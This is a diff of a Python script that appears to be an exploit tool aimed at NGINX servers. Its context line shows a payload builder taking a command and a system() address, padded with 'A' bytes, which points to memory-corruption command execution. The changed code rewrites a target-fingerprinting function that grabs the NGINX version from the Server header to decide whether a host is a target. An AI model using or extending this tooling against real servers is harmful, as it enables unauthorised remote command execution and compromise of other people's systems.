@@ -109,26 +109,65 @@ def make_body(cmd: str, data_addr: int, system_addr: int) -> bytes:
     return payload + b'\x41' * (BODY_LEN - len(payload))
 
 def check_target(host: str, port: int, timeout: int = 5) -> Tuple[bool, Optional[str]]:
-    """Check if target is running NGINX and potentially vulnerable"""
+    """Check if target is running NGINX"""
+
     try:
         s = socket.create_connection((host, port), timeout=timeout)
-        s.sendall(b"GET / HTTP/1.1\r\nHost: test\r\nConnection: close\r\n\r\n")
-        response = s.recv(4096)
+
+        request = (
+            b"GET / HTTP/1.1\r\n"
+            b"Host: test\r\n"
+            b"Connection: close\r\n\r\n"
+        )
+
+        s.sendall(request)
+
+        response = b""
+
+        while True:
+            chunk = s.recv(4096)
+
+            if not chunk:
+                break
+
+            response += chunk
+
         s.close()
-        
-        response_str = response.decode('utf-8', errors='ignore')
-        
-        # Check for NGINX
-        if 'nginx' in response_str.lower() or 'server: nginx' in response_str.lower():
-            # Try to extract version
+
+        response_str = response.decode("utf-8", errors="ignore")
+
+        # Detect nginx
+        if "nginx" in response_str.lower():
+
             version = None
-            for line in response_str.split('\n'):
-                if 'server:' in line.lower() and 'nginx' in line.lower():
-                    version = line.split('nginx')[1].split()[0].strip('/')
+
+            for line in response_str.split("\n"):
+
+                if "server:" in line.lower() and "nginx" in line.lower():
+
+                    parts = line.lower().split("nginx/")
+
+                    # Ex:
+                    # Server: nginx/1.29.1
+                    if len(parts) > 1:
+
+                        try:
+                            version = parts[1].split()[0].strip()
+
+                        except Exception:
+                            version = None
+
+                    # Ex:
+                    # Server: nginx
+                    else:
+                        version = None
+
                     break
+
             return True, version
-        
+
         return False, None
+
     except Exception as e:
         log_error(f"Failed to connect to target: {e}")
         return False, None
